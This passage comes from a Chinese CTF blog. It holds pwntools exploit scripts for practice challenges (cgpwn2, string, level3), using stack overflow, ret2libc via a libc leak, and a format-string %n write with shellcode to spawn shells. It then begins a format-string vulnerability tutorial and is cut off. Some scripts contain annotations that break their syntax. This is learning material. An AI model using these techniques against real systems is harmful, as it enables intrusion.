所以可以整数溢出的办法, buf长512也够了</p><h3 id="8-3-脚本"><a href="#8-3-脚本" class="headerlink" title="8.3 脚本"></a>8.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>r = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">50645</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x0804868B</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">232</span><br>r.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">&quot;f**k&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;passwd:\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="9-cgpwn2"><a href="#9-cgpwn2" class="headerlink" title="9 cgpwn2"></a>9 cgpwn2</h2><h3 id="9-1-checksec"><a href="#9-1-checksec" class="headerlink" title="9.1 checksec"></a>9.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/dOLQ8A5XaRMDF47.png" alt="20"></p><h3 id="8-2-找漏洞-1"><a href="#8-2-找漏洞-1" class="headerlink" title="8.2 找漏洞"></a>8.2 找漏洞</h3><p><img src="https://i.loli.net/2021/07/19/KJQpnbUuq5aoPOl.png" alt="21"></p><p>溢出点肯定就是gets函数啦。偏移值0x2A。<br>但是我们需要自己构造system函数的参数，只要把name的值改成那个值就行了。</p><h3 id="9-3-脚本"><a href="#9-3-脚本" class="headerlink" title="9.3 脚本"></a>9.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x2A</span>(<span class="hljs-string">&#x27;捏妈的,0x26+0x4能给我算成0x30来?&#x27;</span>) + p32(<span class="hljs-number">0x8048420</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>-&gt;sys返回地址<span class="hljs-string">&#x27; + p32(0x804A080)&#x27;</span>name的地址<span class="hljs-string">&#x27;</span><br><span class="hljs-string">r = process(&#x27;</span>./cgpwn2<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>name\n<span class="hljs-string">&#x27;,&#x27;</span>/<span class="hljs-built_in">bin</span>/sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>here:\n<span class="hljs-string">&#x27;,payload)</span><br><span class="hljs-string">r.interactive()</span><br></code></pre></div></td></tr></table></figure><h2 id="10-string"><a href="#10-string" class="headerlink" title="10 string"></a>10 string</h2><h3 id="10-1-checksec"><a href="#10-1-checksec" class="headerlink" title="10.1 checksec"></a>10.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/f6NWvTAL2tYuKkr.png" alt="22"></p><h3 id="10-2-找漏洞"><a href="#10-2-找漏洞" class="headerlink" title="10.2 找漏洞"></a>10.2 找漏洞</h3><p>代码好长啊。</p><img src="https://i.loli.net/2021/07/19/32uH7CzocNe4bKE.png" alt="23" style="zoom:80%;" /><p>看看func1。</p><img src="https://i.loli.net/2021/07/19/JI9wTKFP6li1gZV.png" alt="24" style="zoom: 80%;" /><p>func2。</p><img src="https://i.loli.net/2021/07/19/AscTUzQ9x1KXBR8.png" alt="25" style="zoom:80%;" /><p>没有溢出点。func3。</p><img src="https://i.loli.net/2021/07/19/3DxVSQvWNoB58ea.png" alt="26" style="zoom:80%;" /><p>好啦，溢出点。</p><p><img src="https://i.loli.net/2021/07/19/vAengmcpkH6dqK4.png" alt="27"></p><p>很明显，让a1数组的第0位和第1位相等（就是85和68）。</p><p>后面那个mmap是内存映射，意思就是填入一个机器码使得直接执行。</p><h3 id="10-3-脚本"><a href="#10-3-脚本" class="headerlink" title="10.3 脚本"></a>10.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;%68c%7$n&#x27;</span><span class="hljs-comment"># b&#x27;a&#x27;*85 + &#x27;%7$n&#x27;也是可以的</span><br>r = process(<span class="hljs-string">&#x27;./string&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;secret[1] is &#x27;</span>)<br>a = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0x&#x27;</span>+r.recvline(),base=<span class="hljs-number">16</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name be:\n&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;up?:\n&#x27;</span>,<span class="hljs-string">&#x27;east&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;leave(0)?:\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;address&#x27;\n&quot;</span>,<span class="hljs-built_in">str</span>(a))<br>r.sendlineafter(<span class="hljs-string">&#x27;wish is:\n&#x27;</span>,payload)<br>r.sendlineafter(<span class="hljs-string">&#x27;SPELL\n&#x27;</span>,asm(shellcraft.amd64.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>))<br><span class="hljs-comment">#当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。</span><br><span class="hljs-comment">#获得执行system(“/bin/sh”)汇编代码所对应的机器码： asm(shellcraft.sh()) 。注意要指明arch和os。arch有</span><br><span class="hljs-comment">#i386(x86)和amd64(x64)。攻防世界的题解区有人说这个函数失效，其实是因为他没指明环境。不同环境下的汇编代</span><br><span class="hljs-comment">#码是不同的。</span><br>r.interactive()<br><br><span class="hljs-comment">#AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-</span><br></code></pre></div></td></tr></table></figure><h2 id="11-level3"><a href="#11-level3" class="headerlink" title="11 level3"></a>11 level3</h2><h3 id="11-1-checksec"><a href="#11-1-checksec" class="headerlink" title="11.1 checksec"></a>11.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/kwIAFZPTb5BuMfV.png" alt="28"></p><h3 id="11-2-找漏洞"><a href="#11-2-找漏洞" class="headerlink" title="11.2 找漏洞"></a>11.2 找漏洞</h3><p>开IDA看看，看到有一个read的栈溢出。</p><p><img src="https://i.loli.net/2021/07/19/4SCUlP8QLGINi7k.png" alt="29"></p><p>只有write和read函数，那只能通过泄露libc的基址来调用<code>system(&#39;/bin/sh&#39;)</code>了。</p><p>我们可以知道的有：write函数的plt表位置和got表位置。由于在read函数之前已经调用过write函数了，即已经完成了延迟绑定，那么got表中已经记录了write的地址，由于libc的函数偏移值是固定的，则可以获得libc的基址，并得到system函数的实际地址。</p><h3 id="11-3-脚本"><a href="#11-3-脚本" class="headerlink" title="11.3 脚本"></a>11.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>aaaa<br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>DEBUG = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> DEBUG == <span class="hljs-number">1</span>:<br>p = process(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>,<span class="hljs-number">56008</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(write_plt)  + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#从这里跳转到write函数中,默认当前栈顶就是返回地址,下面的依次是参数1-n(先压参数再返回地址)</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>p.sendline(payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<span class="hljs-comment">#unpack() 这里是write函数输出的got</span><br><br><span class="hljs-comment">#print(hex(write_addr))</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<span class="hljs-comment">#重新进入main函数</span><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr = (write_addr - write_libc)<span class="hljs-string">&#x27;&#x27;&#x27;这玩意儿是基址&#x27;&#x27;&#x27;</span> + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = (write_addr - write_libc) + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(system_addr) + p32(main_addr) + p32(binsh_addr) <br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;111.200.241.244&#x27;</span>, <span class="hljs-number">63933</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = write_addr - write_libc + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh_addr = write_addr - write_libc + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(sys_addr) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + sh_addr<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn题:格式化输出字符串漏洞</title>
    <link href="/2021-07/pwn-start-ctf-pwn1/"/>
    <url>/2021-07/pwn-start-ctf-pwn1/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn：格式化字符串漏洞"><a href="#pwn：格式化字符串漏洞" class="headerlink" title="pwn：格式化字符串漏洞"></a>pwn：格式化字符串漏洞</h1><p>CTF——PWN的基础漏洞类型。 </p><h2 id="1-printf函数的格式化字符串漏洞"><a href="#1-printf函数的格式化字符串漏洞" class="headerlink" title="1 printf函数的格式化字符串漏洞"></a>1 printf函数的格式化字符串漏洞</h2><h3 id="1-1-printf函数"><a href="#1-1-printf函数" class="headerlink" title="1.1 printf函数"></a>1.1 printf函数</h3><p>printf()函数是格式化输出函数, 一般用于向准则输出设备按规定式样输出消息。<br>函数的原型为：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br></code></pre></div></td></tr></table></figure><p>printf()函数的调用格式为:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&lt;格式化字符串&gt;&quot;</span>, &lt;参量表&gt;);<br></code></pre></div></td></tr></table></figure><p>其中格式化字符串包括两部分内容: 一部分是正常字符, 这些字符将按原样输出; 另一部分是格式化规定字符, 以”%”开始, 后跟一个或几个规定字符,用来确定输出内容格式。参量表是需要输出的一系列参数, 其个数必须与格式化字符串所说明的输出参数个数一样多, 各参数之间用”,”分开, 且顺序一一对应, 否则将会出现意想不到的错误。</p><p>printf()函数的大家族：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">snprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdarg.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vprintf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vfprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vdprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_list ap)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vsnprintf</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, va_lis t ap)</span></span>;<br></code></pre></div></td></tr></table></figure><ul><li>fprintf()按照格式字符串的内容将输出写入流中。三个参数为流、格式字符串和变参列表。</li><li>printf()等同于fprintf()，但是它假定输出流为stdout。 </li><li>sprintf()等同于fprintf()，但是输出不是写入流而是写入数组。在写入的字符串末尾必须添加一个空字符。</li><li>snprintf()等同于sprintf()，但是它指定了可写入字符的最大值size。当size大于零时，输出字符超过第size-1的部分会被舍弃而 不会写入数组中，在写入数组的字符串末尾会添加一个空字符。</li><li>dprintf()等同于fprintf()，但是它输出不是流而是一个文件描述符fd 。</li><li>vfprintf()、vprintf()、vsprintf()、vsnprintf()、vdprintf()分别与上面的函数对应，只是它们将变参列表换成了va_list类型的参数。</li></ul><h3 id="1-2-格式字符串format"><a href="#1-2-格式字符串format" class="headerlink" title="1.2 格式字符串format"></a>1.2 格式字符串format</h3><p>格式字符串是由普通字符（ordinary character，包括 % ）和转换规则（conversion specification）构成的字符序列。普通字符被原封不动地复制到输出流中。转换规则根据与实参对应的转换指示符对其进行转换，然后将结果写入输出流中。<br>一个转换规则有可选部分和必需部分组成：</p><div class="hljs code-wrapper"><pre><code>%[ 参数 ][ 标志 ][ 宽度 ][ .精度 ][ 长度 ] 转换指示符</code></pre></div><ul><li>（必需）转换指示符：</li></ul><table><thead><tr><th>字符</th><th align="left">描述</th></tr></thead><tbody><tr><td>d,i</td><td align="left">有符号十进制数值<code>int</code>。<code>%d</code> 与<code>%i </code>对于输出是同义；但对于<code>scanf()</code>输入二者不同，其中<code>%i</code>在输入值有前缀<code>0x</code>或<code>0</code>时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>u</td><td align="left">十进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>f,F</td><td align="left"><code>double</code>型输出10进制定点表示。<code>f </code>与 <code>F</code> 差异是表示无穷与NaN时，<code>f</code>输出<code>inf</code>, <code>infinity</code>与 <code>nan</code>；<code>F</code> 输出<code>INF</code>, <code>INFINITY</code>与<code>NAN</code>。小数点后的数字位数等于精度，最后一位数字四舍五入。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td></tr><tr><td>e,E</td><td align="left"><code>double</code>值，输出形式为10进制的<code>([ - ]d.ddd e [ + / - ]ddd)</code>. E版本使用的指数符号为<code>E</code>（而不是<code>e</code>）。指数部分至少包含2位数字，如果值为0，则指数部分为00。Windows系统，指数部分至少为3位数字，例如1.5e002，也可用Microsoft版的运行时函数<code>_set_output_format</code>修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td></tr><tr><td>g,G</td><td align="left"><code>double</code>型数值，精度定义为全部有效数字位数。当指数部分在闭区间 [-4,精度] 内，输出为定点形式；否则输出为指数浮点形式。<code>g</code>使用小写字母，<code>G</code>使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td></tr><tr><td>x,X</td><td align="left">16进制<code>unsigned int</code>。<code>x</code>使用小写字母；<code>X</code>使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>o</td><td align="left">8进制<code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td></tr><tr><td>s</td><td align="left">如果没有用<code>l</code>标志，输出<code>null</code>结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了<code>l</code>标志，则对应函数参数指向<code>wchar_t</code>型的数组，输出时把每个宽字符转化为多字节字符，相当于调用<code>wcrtomb</code> 函数。</td></tr><tr><td>c</td><td align="left">如果没有用<code>l</code>标志，把<code>int</code>参数转为<code>unsigned char</code>型输出；如果用了<code>l</code>标志，把<code>wint_t</code>参数转为包含两个元素的 <code>chart_t</code>数组，其中第一个元素包含要输出的字符，第二个元素为<code>null</code>宽字符。</td></tr><tr><td>p</td><td align="left">void*型，输出对应变量的值。 <code>printf(&quot;%p&quot;, a)</code>用地址的格式打印变量a的值， printf(“%p”, &amp;a) 打印变量a所在的地址。</td></tr><tr><td>a,A</td><td align="left">double<code>型的16进制表示，</code>[−]0xh.hhhh p±d<code>。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。</code>a<code>使用小写字母，</code>A`使用大写字母。</td></tr><tr><td>n</td><td align="left">不输出字符，但是把已经成功输出的字符个数写入对应的<strong>整型指针参数</strong>所指的变量。</td></tr><tr><td>%</td><td align="left"><code>% </code>字面值，不接受任何除了<code>参数</code>以外的部分。</td></tr></tbody></table><ul><li>（可选）参数 </li></ul><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td><code>n$</code></td><td><code>n</code>是用这个格式说明符显示第几个参数；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。如果任意一个占位符使用了参数 ，则其他所有占位符必须也使用参数 。例：<code>printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17)</code> 产生<code>17 0x11; 16 0x10</code></td></tr></tbody></table><p>剩下的略（有用再填）。</p><h3 id="1-3-在pwn中的应用"><a href="#1-3-在pwn中的应用" class="headerlink" title="1.3 在pwn中的应用"></a>1.3 在pwn中的应用</h3><p>看上去好像说，<code>printf</code>这个类型的函数只能输出啊。然而实际上，他有一个有趣的转换指示符，那就是：</p><p><code>%n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p><p>我们测试一下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">//printfn.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>a = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1234567890%n\n&quot;</span>,&amp;a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>,a);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc printfn.c -o printfn</span><br><span class="hljs-meta">$</span><span class="bash"> ./printfn</span> <br>a = 1<br>1234567890<br>a = 10<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>你看，仅用标准输出语句就成功改写了a的值！</p><p>说到这里已经很清楚了，我们可以通过修改<strong>参数</strong>的值，来改写<strong>该值所对应的地址的值</strong>，使程序执行发生错误。</p><p>比如以下代码：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">//pwnit.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">80</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">int</span> a = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">int</span> *p = &amp;a;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,buf);<br><span class="hljs-built_in">printf</span>(buf);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%x\n&quot;</span>,a);<br><span class="hljs-keyword">if</span>(a == <span class="hljs-number">0x10</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you pwn me!\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们编译运行一下：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc pwnit.c -m32 -o pwnit</span><br>pwnit.c: In function ‘main’:<br>pwnit.c:8:9: warning: format not a string literal and no format arguments [-Wformat-security]<br>  printf(buf);<br>         ^<br><span class="hljs-meta">$</span><span class="bash"> ./pwnit</span> <br>abcde<br>abcde<br>5<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></div></td></tr></table></figure><p>输入abcde似乎根本没用哦。。但是我们可以输入一个字符串看看，<code>int a = 5</code>这个变量声明在哪：</p><p>输入字符串：aaaa-%p-%p-%p-%p-%p-%p-%p-%p</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div 